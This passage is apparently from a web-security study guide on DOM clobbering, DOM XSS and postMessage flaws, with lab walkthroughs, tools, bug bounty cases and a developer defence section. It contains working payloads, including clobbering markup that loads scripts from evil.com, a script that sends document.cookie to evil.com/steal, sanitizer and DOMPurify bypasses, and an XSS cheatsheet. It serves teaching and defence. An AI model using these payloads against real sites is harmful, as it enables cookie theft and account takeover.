// App uses DOM node where it expected a config object → exploited!

// WHY window.x || {} is dangerous:
// || operator: if left side is FALSY → use right side
// False values: false, 0, "", null, undefined, NaN
// Truthy: ANY object, including DOM nodes!
// → A DOM node is always truthy → left side wins → attacker's element used!
```

---

## 🔑 **DOM Clobbering Levels**

```r
<!-- LEVEL 1 — Clobber a global variable (single element): -->
<a id="targetVariable" href="https://evil.com/evil.js">

<!-- Now: window.targetVariable = <a> element -->
<!-- String(window.targetVariable) = "https://evil.com/evil.js" -->
<!-- If used as: script.src = window.targetVariable → loads evil script! -->

<!-- LEVEL 2 — Clobber object.property (two elements same id): -->
<a id="obj"><a id="obj" name="url" href="https://evil.com/evil.js">

<!-- What happens with two same-id elements:
  → Browser groups them into an HTMLCollection
  → window.obj = HTMLCollection
  → HTMLCollection.url → looks for element with name="url" in collection
  → Returns the second <a> element
  → String(window.obj.url) = "https://evil.com/evil.js"
  → Two-level deep clobbering! -->

<!-- LEVEL 3 — Three levels deep (using form trick): -->
<form id="x" name="y"><input id="z"></form><form id="x"></form>
<!-- window.x = HTMLCollection (two forms with same id) -->
<!-- window.x.y = <form id=x name=y>     ← name attribute -->
<!-- window.x.y.z = <input id=z>         ← id inside that form -->

<!-- LEVEL 3 ALT — Using iframe srcdoc: -->
<iframe name="x" srcdoc="<a id=y href=https://evil.com>">
<!-- window.x = the iframe window object -->
<!-- window.x.y = "https://evil.com"     ← link in iframe's DOM -->
```

---

## 💉 **Real Exploitation — Loading Malicious Script**

```r
// Target JavaScript (from PortSwigger):
window.onload = function() {
    let someObject = window.someObject || {};  // ← vulnerable pattern!
    let script = document.createElement('script');
    script.src = someObject.url;               // ← uses someObject.url
    document.body.appendChild(script);         // ← loads script!
};

// Attack — inject into comment/bio/any HTML input:
<a id=someObject><a id=someObject name=url href=//evil.com/payload.js>

// Clobbering chain:
// window.someObject → the HTMLCollection (truthy!)
// window.someObject || {} → returns HTMLCollection, not {}
// someObject.url → element with name="url" in collection → second <a>
// script.src = "//evil.com/payload.js"
// document.body.appendChild(script) → EVIL SCRIPT LOADED! 💥

// Evil payload at evil.com/payload.js:
document.body.innerHTML = 
    '<form action="https://evil.com/steal" method="POST">' +
    '<input name="data" value="' + document.cookie + '">' +
    '</form>';
document.forms[0].submit();
```

---

## 💉 **Clobbering to Bypass HTML Sanitizer Filters**

```r
// A common HTML sanitizer pattern:
function sanitize(el) {
    // Enumerate all attributes:
    for (var i = 0; i < el.attributes.length; i++) {
        var attrName = el.attributes[i].name;
        if (badAttributes.includes(attrName)) {
            el.removeAttribute(attrName);
        }
    }
}

// ATTACK — inject:
<form id=evil><input id=evil name=attributes>

// What happens:
// form.attributes = HTMLCollection containing <input> (CLOBBERED!)
// sanitizer: el.attributes = <input> element (not a NamedNodeMap!)
// <input>.length = undefined → i < undefined → false → LOOP NEVER RUNS!
// Sanitizer SKIPS the entire element → any event handler survives!

// Add malicious attribute to the form:
<form id=evil tabindex=1 onfocus=alert(1)><input id=evil name=attributes>

// Sanitizer skips it → onfocus=alert(1) survives!

// Trigger via iframe (PortSwigger lab technique):
<iframe src="https://victim.com/post?postId=3"
        onload="setTimeout(()=>{
            location='https://victim.com/post?postId=3#evil'
        },500)">
// After 500ms → adds #evil fragment → browser focuses element id=evil
// onfocus triggers → alert(1) executes! 💥
```

---

## 💉 **DOMPurify Bypass via DOM Clobbering (cid: Protocol)**

```r
// Target code that's "protected" by DOMPurify:
let defaultAvatar = window.defaultAvatar
    || {avatar: '/resources/images/default.svg'}
// ← This pattern is STILL vulnerable to clobbering!
// ← DOMPurify sanitizes HTML but NOT the JS code's logic!

// DOMPurify normally strips dangerous things BUT:
// It allows the "cid:" protocol (Content-ID, used in email)
// cid: does NOT HTML-encode double quotes!

// Lab exploit payload (inject as comment body):
<a id=defaultAvatar>
<a id=defaultAvatar name=avatar href="cid:&quot;onerror=alert(1)//">

// Clobbering chain:
// window.defaultAvatar = HTMLCollection (truthy!)
// defaultAvatar.avatar = element with name="avatar"
// href = cid:"onerror=alert(1)//
// Note: DOMPurify allows cid: but the quote isn't encoded → breaks out!

// On next page load (when another comment is posted):
// The clobbered defaultAvatar is used → onerror attribute fires → alert! 💥
```

---

## 📋 **DOM Clobbering — Attack Pattern Summary**

```js
Target Pattern          → Clobbering Markup
─────────────────────────────────────────────
window.x || {}          → <a id=x>
window.x.y              → <a id=x><a id=x name=y href=payload>
element.attributes      → <form id=x><input id=x name=attributes>
script.src = obj.url    → <a id=obj><a id=obj name=url href=evil.js>
if (window.feature)     → <a id=feature> (makes it truthy!)
```

---

## 📌 **When DOM Clobbering is Applicable**

```js
✅ Use DOM Clobbering when:
   → Direct XSS is impossible (filtered by HTML sanitizer)
   → BUT the sanitizer allows id= or name= attributes
   → AND JavaScript uses window.* || defaultValue patterns
   → AND JavaScript uses object.property from global variables

❌ DOM Clobbering does NOT work when:
   → JavaScript uses: const x = {} (const prevents clobbering)
   → let/const are used instead of var for globals
   → Code checks: if (!(window.x instanceof HTMLElement)) { }
   → DOMPurify with DOM Clobbering protection enabled
   → Strict mode JavaScript (but even then some vectors work)

🔑 KEY CODE PATTERNS TO HUNT FOR:
   var config = window.config || {};
   var settings = window.settings || defaultSettings;
   someObject.url used in script.src
   element.attributes.length in filter loops
   window.anything without instanceof check
```

---

# **26. 🛠️ Tools Used for Detection & Exploitation**

---

## 🛠️ **Tool 1 — Burp Suite DOM Invader (Primary Tool)**

```js
What it is:
  → Browser extension built into Burp's embedded Chromium browser
  → Automates DOM-based vulnerability discovery

Key Features:
  ✅ Source tracking: Identifies all sources (location.search, hash, etc.)
  ✅ Sink detection: Shows where tainted data lands
  ✅ postMessage interception: Shows all message handlers + sends probes
  ✅ DOM clobbering detection: Identifies clobberable variables
  ✅ Stack trace: Shows exact code path from source to sink
  ✅ Automated exploit suggestions

How to use:
  1. Open Burp Suite → embedded browser
  2. Click "DOM Invader" icon in browser toolbar
  3. Enable: Sources, Sinks, postMessage, DOM Clobbering
  4. Navigate to target page
  5. Inject canary: click "Inject URL params"
  6. Check "Canary reflected" panel → see where canary lands
  7. For postMessage: check "Web Messages" tab → "Send probe"
  8. For clobbering: check "DOM Clobbering" tab

Where to find reports:
  → DOM Invader panel at bottom of Burp browser
  → Burp Pro → "Issues" pane also shows findings
```

---

## 🛠️ **Tool 2 — Browser DevTools (Manual Testing)**

```js
Chrome DevTools Workflow:

1. F12 to open DevTools
2. Elements tab: Ctrl+F to search DOM for your canary value
3. Sources tab: search all JS files with Ctrl+Shift+F
4. Console tab: test JS snippets directly
5. Network tab: watch for suspicious requests (data exfiltration?)
6. Application tab: check localStorage, sessionStorage, cookies

Key DevTools tricks:
  → Breakpoints: right-click line number → "Add breakpoint"
  → Conditional breakpoints: right-click → "Add conditional breakpoint"
    e.g., condition: variable.includes('CANARY')
  → Event listener breakpoints: Sources → Event Listener Breakpoints
    → Enable "Script" under "Script" to catch eval()
  → DOM mutation breakpoints: right-click element → Break on → Subtree modifications

Testing location.hash (invisible to server):
  → Simply type in browser: site.com/#CANARY123
  → Check DevTools console: location.hash → "#CANARY123"
  → Check Elements → search for "CANARY123"
  → If found in DOM → trace which JavaScript put it there
```

---

## 🛠️ **Tool 3 — Burp Suite Professional**

```js
For DOM XSS automated scanning:
  → Proxy → Intercept page
  → Target → Site map → right-click → "Scan"
  → Scanner uses headless browser to test DOM sinks
  → Reports DOM XSS vulnerabilities automatically

Manual approach with Repeater:
  → Intercept request with DOM-based payload
  → Send to Repeater → modify URL parameters
  → Check response for reflection patterns
```

---

## 🛠️ **Tool 4 — Open Source Tools**

```js
1. DOMPurify (Sanitization):
   → npm install dompurify
   → import DOMPurify from 'dompurify'
   → DOMPurify.sanitize(userInput) → safe HTML

2. postMessage-tracker (Chrome Extension):
   → Monitors all postMessage events in real-time
   → Shows sender origin, target, and data
   → Good for manual postMessage analysis

3. Posta:
   → Tool for testing cross-document messaging
   → Tracks and exploits postMessage vulnerabilities
   → CLI + web UI

4. PMHook (TamperMonkey):
   → Wraps addEventListener to log all message handlers
   → Shows handlers as they're added at runtime
   → Good for SPA (Single Page Application) testing

5. eslint-plugin-no-unsanitized:
   → Mozilla's ESLint plugin
   → Statically detects dangerous DOM sinks in source code
   → Run during development to catch issues before deployment

6. Retire.js:
   → Detects vulnerable JavaScript libraries in use
   → Libraries with known DOM XSS vulnerabilities

7. DOM Snitch (Chrome extension by Google):
   → Enables developers/testers to identify insecure client-side code
   → Monitors DOM mutations and script sources

8. Untrusted Types:
   → Browser extension for detecting DOM XSS
   → Works alongside Trusted Types policy
```

---

## 🛠️ **Tool 5 — Manual Code Review Techniques**

```r
Grep/Search patterns to find DOM vulnerabilities in source:

// Find all sinks:
grep -r "document\.write" ./js/
grep -r "innerHTML" ./js/
grep -r "outerHTML" ./js/
grep -r "eval(" ./js/
grep -r "setTimeout(" ./js/

// Find all sources:
grep -r "location\.search" ./js/
grep -r "location\.hash" ./js/
grep -r "window\.name" ./js/
grep -r "document\.referrer" ./js/

// Find postMessage handlers:
grep -r "addEventListener.*message" ./js/
grep -r "onmessage" ./js/

// Find DOM clobbering patterns:
grep -r "window\." ./js/ | grep "||"   // window.x || {} patterns
grep -r "\.attributes\.length" ./js/    // attribute iteration (clobberable)
```

---

# **27. 🌍 Real-World Examples & Bug Bounty Cases**

---

## 🏆 **Case 1 — Twitter/TweetDeck (2023)**

```js
Platform: Twitter's TweetDeck service
Year: Late 2023
Type: DOM-based XSS via URL parameter tampering

What happened:
  → Parameter tampering vulnerability in TweetDeck
  → Attacker could inject JavaScript via URL parameters
  → Malicious payload executed in victim's browser
  → Authentication tokens could potentially be stolen

Impact:
  → Could affect millions of users
  → Authentication tokens at risk → account takeover possible
  → High-profile service = massive attack surface

Lesson:
  → Even large, well-funded companies miss DOM XSS
  → Client-side code is just as critical as server-side
```

---

## 🏆 **Case 2 — Gmail AMP4Email DOM Clobbering (2019)**

```js
Researcher: Michał Bentkowski
Type: DOM Clobbering → XSS in Gmail's AMP4Email

What happened:
  → Gmail allowed AMP email content (HTML in emails)
  → AMP content was sanitized... but with clobbering oversight
  → Attacker injected id/name attributes that matched
    JavaScript variables Gmail's code relied on
  → Clobbered variable caused malicious URL to be loaded as script
  → XSS in Gmail's origin! (access to all email data)

Attack:
  <a id=defaultAvatar>
  <a id=defaultAvatar name=avatar href="//evil.com/payload.js">
  → Gmail's code: window.defaultAvatar.avatar → loaded evil.js!

Impact:
  → Full access to victim's Gmail data
  → Read all emails, send emails as victim
  → Critical severity — paid out significant bug bounty

Lesson:
  → id and name attributes in HTML are dangerous even without <script>
  → HTML sanitizers must specifically handle DOM Clobbering
  → window.x || {} patterns are vulnerable even in "sanitized" contexts
```

---

## 🏆 **Case 3 — Webpack CVE-2024-43788 (2024)**

```js
Product: Webpack (used by virtually ALL modern web apps!)
Type: DOM Clobbering Gadget in AutoPublicPathRuntimeModule
CVE: CVE-2024-43788
CVSS: HIGH

What happened:
  → Webpack-compiled code had this pattern:
    var scriptUrl = document.currentScript.src;
    __webpack_require__.p = scriptUrl;
  → document.currentScript can be CLOBBERED
  → Attacker injects: <img name="currentScript" src="https://evil.com/payload.js">
  → document.currentScript → returns attacker's <img>
  → .src = "https://evil.com/payload.js"
  → Webpack uses this as BASE URL for loading modules!
  → All subsequent Webpack module loads → load from evil.com! 💥

Exploited in: Canvas LMS (used by universities worldwide)

Lesson:
  → DOM Clobbering affects popular frameworks and build tools
  → Not just custom code — libraries themselves can have gadgets
  → Any site using Webpack could potentially be affected
```

---

## 🏆 **Case 4 — HackerOne DOM XSS via postMessage (Bug Bounty Report)**

```js
Platform: HackerOne's own website
Type: DOM XSS via postMessage (insecure Marketo integration)
Reporter: @s_p_q_r (via HackerOne)

What happened:
  → HackerOne embedded Marketo marketing JavaScript
  → Marketo's code had a postMessage listener with indexOf() check:
    if (e.origin.indexOf('marketo.com') > -1) { eval(e.data); }
  → indexOf check is bypassable!
  → By hosting attack page at: http://www.marketo.com.evil.com
    ("marketo.com" IS in this string → indexOf returns > -1)
  → Attacker sends postMessage from evil domain:
    targetWindow.postMessage('alert(document.cookie)', '*')
  → eval(e.data) → alert fires on HackerOne!

Impact:
  → Cookie theft on HackerOne
  → Potential account takeover for security researchers
  → Ironic: security platform itself was vulnerable!

Lesson:
  → indexOf() origin checks are NEVER safe
  → Third-party JavaScript (like marketing tools) can introduce DOM vulns
  → Always use === for origin checks
```

---

## 🏆 **Case 5 — window.name Persistence Attack (Classic)**

```r
Type: DOM XSS via window.name source
Scenario: News site with comment system

Attack chain:
  Step 1: Attacker hosts page at evil.com with:
    window.name = '<img src=1 onerror=alert(document.cookie)>';
    // Sets the window name to the payload
    
  Step 2: Attacker sends victim link to evil.com/redirect.html:
    <script>window.name = 'PAYLOAD'; location = 'https://victim.com';</script>
    
  Step 3: Victim navigates → victim.com loads
    The window.name persists across the navigation!
    
  Step 4: victim.com's JavaScript:
    var displayName = window.name;  // ← reads the attacker's payload!
    document.getElementById('greeting').innerHTML = displayName;
    // → innerHTML renders the <img> → onerror fires → XSS! 💥

Why it worked:
  → window.name persists even after cross-origin navigation
  → The attack starts on evil.com but fires on victim.com
  → Server receives no hint of attack — "View Source" shows clean HTML

Lesson:
  → window.name is a persistent, cross-navigation source
  → Never use window.name with innerHTML or eval()
  → Treat window.name as untrusted user input, always
```

---

# **28. 📋 Quick Reference Cheatsheet**

---

## 🎯 **Testing Checklist — Penetration Tester / Bug Bounty Hunter**

```js
☐ STEP 1 — Setup:
   → Open target in Burp's embedded browser with DOM Invader enabled
   → Enable ALL DOM Invader sources
   → Open DevTools (F12)

☐ STEP 2 — Inject Canary:
   → Add unique string to URL: ?q=CANARY12345XYZ
   → Also try in hash: #CANARY12345XYZ
   → DOM Invader → "Inject URL params" button

☐ STEP 3 — Find Sources:
   → Ctrl+Shift+F → search JS for: location.search / location.hash /
     window.name / document.referrer / document.cookie /
     addEventListener('message' / localStorage / sessionStorage

☐ STEP 4 — Find Sinks:
   → Search for: document.write / innerHTML / eval / setTimeout /
     location.href / location = / document.cookie = / new WebSocket /
     element.href / element.src / element.action / setRequestHeader

☐ STEP 5 — Trace Taint Flow:
   → Set debugger breakpoints at sources
   → Follow variable through code to sink
   → Confirm canary reaches sink

☐ STEP 6 — Determine Context:
   → Is it inside HTML? → break out with ">
   → Is it inside JS string? → break out with '
   → Is it inside innerHTML? → use <img onerror=...>
   → Is it in eval()? → direct JS execution
   → Is it in location? → try javascript: URI

☐ STEP 7 — Check postMessage:
   → Find addEventListener('message' handlers
   → Check origin verification method
   → Test indexOf/endsWith/startsWith bypasses
   → Use DOM Invader "Web Messages" tab

☐ STEP 8 — Check DOM Clobbering:
   → Search for: window.x || {} patterns
   → Search for: .attributes.length in filter code
   → DOM Invader → "DOM Clobbering" tab
   → Try injecting: <a id=targetVar href=payload>

☐ STEP 9 — Craft & Deliver Exploit:
   → Test payload with DevTools
   → Create proper PoC (URL / iframe / etc.)
   → Verify impact
```

---

## 📊 **Payload Quick Reference**

```r
// ── HTML Sinks (document.write, innerHTML as HTML): ──
<script>alert(document.domain)</script>     // document.write only!
<img src=1 onerror=alert(document.domain)>  // innerHTML safe
<svg onload=alert(1)>                        // innerHTML safe
<details open ontoggle=alert(1)>             // innerHTML safe

// ── JavaScript String Context: ──
'; alert(1);//
"-alert(1)-"
\'-alert(1)//

// ── JavaScript eval Context: ──
alert(document.cookie)
fetch('https://evil.com/?c='+document.cookie)

// ── location/href Sink: ──
javascript:alert(1)            // execute JS (XSS)
https://evil.com               // phishing redirect
//evil.com                     // protocol-relative redirect

// ── jQuery $(selector): ──
#<img src=1 onerror=alert(1)>  // via hash, starts with < = HTML

// ── AngularJS Template: ──
{{constructor.constructor('alert(1)')()}}
{{$on.constructor('alert(1)')()}}

// ── DOM Clobbering: ──
<a id=targetVar href=https://evil.com/evil.js>
<a id=obj><a id=obj name=url href=https://evil.com/evil.js>
<form id=x><input id=x name=attributes>
```

---

## 💎 **Golden Rules**

```js
🥇 Rule 1: SOURCE → SINK without sanitization = DOM vulnerability
           Master this pattern → understand every DOM attack instantly

🥇 Rule 2: location.hash is the STEALTHIEST source
           Never sent to server → invisible to WAF and server logs
           Always prioritize testing location.hash first

🥇 Rule 3: innerHTML CANNOT execute <script> tags
           Use <img onerror=...> or <svg onload=...> for innerHTML
           document.write() CAN execute <script> tags

🥇 Rule 4: eval() / setTimeout(string) = instant Critical severity
           ANY user data reaching these = code execution

🥇 Rule 5: indexOf / endsWith / startsWith origin checks = BYPASSABLE
           Only === is truly safe for origin verification

🥇 Rule 6: DOM Clobbering when XSS is filtered
           id and name attributes overwrite window.* variables
           Look for: window.x || {} patterns in source
           Particularly powerful when id attribute is whitelisted

🥇 Rule 7: window.name persists across navigations
           Set on evil.com → still exists on victim.com
           Never use as trusted data

🥇 Rule 8: textContent is ALWAYS the safest display sink
           Never parses HTML → never executes code

🥇 Rule 9: localStorage creates Stored DOM XSS
           Payload persists across browser sessions
           One-time visit → persistent XSS for all future visits

🥇 Rule 10: Third-party JS inherits your site's DOM vulnerabilities
            Marketing tools, chat widgets, analytics = DOM attack surface
            Always audit third-party scripts
```

---
---

# **29. 🛡️ Prevention — Developer Guide**

---

## 🛡️ **Defence 1 — Use SAFE Sinks (Most Important)**

```r
// ❌ NEVER feed user data into these sinks:
element.innerHTML = userInput;           // ← parses HTML → XSS
document.write(userInput);               // ← parses HTML → XSS
eval(userInput);                         // ← executes JS → worst
setTimeout(userInput, 100);             // ← string = eval equivalent
setInterval(userInput, 100);            // ← same
location.href = userInput;              // ← redirect + javascript: XSS

// ✅ ALWAYS use safe sinks for displaying user data:
element.textContent = userInput;         // NEVER parses HTML
element.innerText = userInput;           // NEVER parses HTML
// These treat the value as PLAIN TEXT regardless of content
// <script>alert(1)</script> → displays as literal text, not executed!

// Safe attribute setting:
element.setAttribute('data-value', userInput);  // ← safe data attribute
// DANGEROUS attribute setting:
element.setAttribute('href', userInput);        // ← javascript: URI possible!
element.setAttribute('src', userInput);         // ← can load attacker resources
element.setAttribute('onclick', userInput);     // ← direct JS execution!
```

---

## 🛡️ **Defence 2 — Sanitize When HTML Rendering is Required**

```r
// When innerHTML or rich text is genuinely needed → sanitize first

// Option 1 — DOMPurify (Most Popular Library):
import DOMPurify from 'dompurify';

// Basic usage:
element.innerHTML = DOMPurify.sanitize(userInput);

// With stricter config (no URLs at all):
element.innerHTML = DOMPurify.sanitize(userInput, {
    ALLOWED_TAGS: ['b', 'i', 'em', 'strong', 'a', 'p'],
    ALLOWED_ATTR: ['href'],
    FORBID_ATTR: ['style', 'onerror', 'onclick']
});

// With DOM Clobbering protection:
element.innerHTML = DOMPurify.sanitize(userInput, {
    SANITIZE_DOM: true  // ← prevents clobbering (default is true)
});

// ✅ DOMPurify is the gold standard — used by:
//    Google, Facebook, GitHub, Atlassian, and thousands more

// Option 2 — Browser's native Sanitizer API (newer):
const sanitizer = new Sanitizer();
element.setHTML(userInput, { sanitizer });
// Available in Chrome 105+ / Firefox 83+
// Not yet in Safari → check browser compatibility

// Option 3 — Manual HTML encoding (simple cases):
function encodeHTML(str) {
    return str
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#x27;')
        .replace(/\//g, '&#x2F;');
}
element.innerHTML = encodeHTML(userInput);
// Converts all HTML to entities → renders as text safely
```

---

## 🛡️ **Defence 3 — Validate URL Sources Before Navigation**

```r
// ❌ VULNERABLE:
location.href = location.search.split('next=')[1];
// or:
location.href = new URLSearchParams(location.search).get('returnUrl');

// ✅ SAFE option 1 — Whitelist allowed paths:
var target = new URLSearchParams(location.search).get('returnUrl');
var allowedPaths = ['/home', '/dashboard', '/profile', '/settings'];
if (allowedPaths.includes(target)) {
    location.href = target;
} else {
    location.href = '/home';  // safe default fallback
}

// ✅ SAFE option 2 — Same-origin validation:
function safeRedirect(url) {
    try {
        var parsed = new URL(url, window.location.origin);
        if (parsed.origin === window.location.origin) {
            location.href = url;  // only redirect within same origin
        } else {
            location.href = '/';  // external URLs → refuse
        }
    } catch (e) {
        location.href = '/';  // invalid URL → refuse
    }
}

// ✅ SAFE option 3 — Block dangerous protocols:
function isSafeUrl(url) {
    // Reject javascript:, data:, vbscript:, etc.
    var protocols = ['http:', 'https:', '/'];
    try {
        var parsed = new URL(url, location.origin);
        return protocols.some(p => url.startsWith(p));
    } catch (e) {
        return false;
    }
}
```

---

## 🛡️ **Defence 4 — Strict postMessage Origin Verification**

```r
// ❌ VULNERABLE — no check:
window.addEventListener('message', function(e) {
    document.body.innerHTML = e.data;  // accepts from ANY domain
});

// ❌ VULNERABLE — indexOf (bypassable):
if (e.origin.indexOf('trusted.com') > -1) { ... }
// Bypass: http://trusted.com.evil.net

// ❌ VULNERABLE — endsWith (bypassable):
if (e.origin.endsWith('.trusted.com')) { ... }
// Bypass: http://anythingattrusted.com

// ❌ VULNERABLE — startsWith (bypassable):
if (e.origin.startsWith('https://trusted.com')) { ... }
// Bypass: https://trusted.com.evil.net

// ✅ SAFE — strict equality (ONLY correct method!):
window.addEventListener('message', function(e) {
    if (e.origin !== 'https://exactly-trusted-site.com') {
        return;  // reject all others
    }
    // Also use safe sink for processing message!
    element.textContent = e.data;  // NOT innerHTML!
});

// ✅ SAFE — Multiple trusted origins:
const TRUSTED_ORIGINS = new Set([
    'https://app.trusted.com',
    'https://admin.trusted.com',
    'https://api.trusted.com'
]);
window.addEventListener('message', function(e) {
    if (!TRUSTED_ORIGINS.has(e.origin)) return;
    // process safely...
});

// ✅ ALSO: Specify targetOrigin when SENDING (not just receiving):
// ❌ WRONG:
childWindow.postMessage(sensitiveData, '*');  // any domain can receive!
// ✅ RIGHT:
childWindow.postMessage(sensitiveData, 'https://trusted.com');  // only this domain
```

---

## 🛡️ **Defence 5 — Prevent DOM Clobbering**

```r
// ❌ VULNERABLE — global OR pattern:
var config = window.config || {};
// Attacker injects <a id=config> → config = DOM element (truthy!)

// ✅ SAFE option 1 — Explicit type check:
var config = window.config;
if (!(config instanceof Object) || (config instanceof Element)) {
    config = {};  // DOM element? → use safe default
}

// ✅ SAFE option 2 — Use let/const (prevents window.x clobbering):
// let config = config || {};
// ← 'let' doesn't create window.config property
// ← window.config can still be clobbered BUT this variable isn't affected

// ✅ SAFE option 3 — Declare with var before using:
var myConfig;  // ← declared with var first
myConfig = window.myConfig;
// ← Clobbering can still affect window.myConfig
// ← But at least myConfig is explicitly declared

// ✅ SAFE — Check .attributes is real before iterating:
// ❌ VULNERABLE filter:
for (var i = 0; i < element.attributes.length; i++) { ... }

// ✅ SAFE filter:
if (element.attributes instanceof NamedNodeMap) {
    for (var i = 0; i < element.attributes.length; i++) {
        // Real attributes — safe to process
    }
}

// ✅ SAFE — Use strict mode:
'use strict';
// Catches some but not all clobbering scenarios
// Prevents accidental global variable creation

// ✅ SAFE — Check property before use:
var url = window.someObject && 
          !(window.someObject instanceof Element) && 
          window.someObject.url;
if (url && typeof url === 'string') {
    script.src = url;  // only if it's actually a string
}
```

---

## 🛡️ **Defence 6 — Content Security Policy (CSP)**

```js
# ✅ Strong CSP that blocks most DOM XSS:
Content-Security-Policy:
    default-src 'self';
    script-src 'self' 'nonce-RANDOM_NONCE_HERE';
    object-src 'none';
    base-uri 'self';
    frame-ancestors 'self';
    script-src-attr 'none';

# What each directive does:
# default-src 'self'         → only load from same origin
# script-src 'self' nonce    → scripts need matching nonce OR be from same origin
# object-src 'none'          → no plugins (Flash, Java applets, etc.)
# base-uri 'self'            → prevents <base> tag injection
# frame-ancestors 'self'     → prevents clickjacking + postMessage iframe attacks
# script-src-attr 'none'     → BLOCKS ALL INLINE EVENT HANDLERS!
#                               → defeats: <img onerror=...> in innerHTML
#                               → defeats: onclick=, onmouseover=, etc.

# This single directive (script-src-attr 'none') is extremely powerful
# It blocks the most common innerHTML XSS payloads at browser level!

# ⚠️ CSP does NOT fully prevent DOM Clobbering
# → DOM Clobbering doesn't execute scripts directly
# → A strong CSP limits clobbering's impact but doesn't stop it
```

---

## 🛡️ **Defence 7 — Trusted Types (Modern Browsers)**

```r
// Trusted Types API (Chrome 83+, Edge 83+):
// Forces developers to ONLY pass certain types to dangerous sinks
// Regular strings are REJECTED by dangerous sinks → must create "trusted" versions

// Enable via CSP header:
Content-Security-Policy: require-trusted-types-for 'script';

// Now: element.innerHTML = "user input" → THROWS ERROR!
// Must use a Trusted Type policy instead:

const policy = trustedTypes.createPolicy('myPolicy', {
    createHTML: (input) => {
        return DOMPurify.sanitize(input);  // sanitize before creating trusted type
    }
});

// Safe usage with trusted types:
element.innerHTML = policy.createHTML(userInput);
// ← Now DOMPurify runs and creates a TrustedHTML type
// ← Browser accepts TrustedHTML in innerHTML
// ← Plain strings (user input) are REJECTED automatically!

// Benefits:
// → Even if developer forgets to sanitize → browser throws error
// → Can't accidentally bypass → it's enforced at browser level
// → Works with eval(), setTimeout(), etc. too
// → Best long-term solution for preventing DOM XSS
```

---

## 🛡️ **Defence Priority Order**

```js
🥇 Priority 1 — Fix the code (root cause):
   ✅ Replace innerHTML with textContent/innerText where possible
   ✅ Never pass user data to eval(), setTimeout(string), Function()
   ✅ Validate URL sources before assigning to location.*
   ✅ Never build URLs from unvalidated sources

🥈 Priority 2 — Sanitization:
   ✅ DOMPurify before ANY innerHTML assignment
   ✅ Whitelist validation before URL/redirect operations
   ✅ HTML encoding for simple text display in HTML context

🥉 Priority 3 — Cross-origin security:
   ✅ Use === strict equality for ALL origin checks
   ✅ Specify exact targetOrigin when sending postMessage
   ✅ If not needed — remove ALL message event listeners

🏅 Priority 4 — DOM Clobbering defences:
   ✅ Avoid var x = window.x || {} patterns
   ✅ Check instanceof NamedNodeMap in filter loops
   ✅ Use type-checking before using global properties
   ✅ Enable DOMPurify's SANITIZE_DOM: true option

🏅 Priority 5 — Deployment-level enforcement:
   ✅ CSP with script-src nonce + script-src-attr 'none'
   ✅ Trusted Types API (enforces sanitization at browser level)
   ✅ X-Frame-Options or frame-ancestors CSP (prevents iframe attacks)

🏅 Priority 6 — Ongoing testing:
   ✅ Integrate DOM Invader into regular pentesting workflow
   ✅ Use ESLint + no-unsanitized plugin in development pipeline
   ✅ Audit ALL third-party JavaScript imports
   ✅ Monitor for new DOM Clobbering gadgets in dependencies (e.g., Webpack)
   ✅ Code review: grep for dangerous sinks in JS files
```

---

## 📚 Additional Resources

|Resource|What's In It|
|---|---|
|🌐 PortSwigger Web Security Academy|Labs, theory, full DOM topic coverage|
|🌐 OWASP DOM XSS Prevention Cheat Sheet|Developer defence guide|
|🌐 OWASP DOM Clobbering Prevention Cheat Sheet|Clobbering defence patterns|
|🌐 domclob.xyz|DOM Clobbering wiki, browser testing, payload generation|
|📄 "It's DOM Clobbering Time" (IEEE S&P 2023)|Academic research on DOM Clobbering|
|🌐 HackTricks DOM XSS|Additional attack techniques|
|🌐 Intigriti Blog|Bug bounty exploitation guides|
|🛠️ Burp DOM Invader|Best tool for DOM vuln discovery|
|🌐 MDN — window.postMessage docs|Official postMessage specification|
|🌐 OWASP — DOM Based XSS|Foundational reference|

---
